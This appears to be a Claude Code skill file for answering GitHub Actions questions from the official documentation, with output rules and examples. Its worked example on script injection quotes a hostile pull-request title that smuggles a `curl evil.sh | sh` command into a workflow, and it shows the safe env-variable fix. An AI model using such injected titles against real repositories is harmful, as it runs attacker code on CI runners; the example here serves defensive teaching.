---
name: github-actions-docs-grounded
description: Answer GitHub Actions questions with official docs-first guidance and explicit links, avoiding stale memory.
---

# GitHub Actions Docs Grounded

Use this skill when the request is about GitHub Actions concepts, workflow syntax,
runners, security patterns, reusable workflows, environments, or migration to Actions.

## Workflow

1. Classify the question:
   - syntax/events/contexts,
   - runners/execution,
   - security/tokens/OIDC,
   - deploy/environments,
   - migration.
2. Prefer official docs on `docs.github.com`.
3. Provide a direct answer first, then links to exact pages.
4. Mark any inference explicitly.

## Output shape

1. Direct answer.
2. Relevant official docs links.
3. YAML example only if needed.
4. Inference note if multiple docs were combined.

## Guardrails

- Do not answer from memory alone when details can drift.
- Do not link only to the docs homepage when a specific page exists.
- Route repo-specific failing CI debugging to local troubleshooting commands.

## Examples

How this gets called in Claude Code, and what it should hand back.

| Ask Claude | What you get |
|---|---|
| "how do I deploy without a long-lived cloud key?" | The OIDC answer, the exact docs pages, and the `permissions:` block it requires |
| "what's the difference between `pull_request` and `pull_request_target`?" | Direct answer first, then the security page — this one is answered from docs, never memory |
| "our CI is failing on this repo" | Routed to local troubleshooting; this skill covers Actions itself, not one repo's run |

**Worked example**

> "is it safe to use the PR title in a run-name?"

```
Answer
  No, not interpolated into a shell. ${{ github.event.pull_request.title }} in a `run:`
  block is substituted before the shell sees it, so a PR titled `"; curl evil.sh | sh; #`
  executes. Pass it through `env:` and reference "$TITLE" instead.

Docs
  https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
  https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/setting-an-environment-variable

Example
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "$TITLE"

Inference: none — both points are stated on the hardening page.
```

The inference note is not decoration. When an answer is assembled from two pages rather
than stated on one, say so.
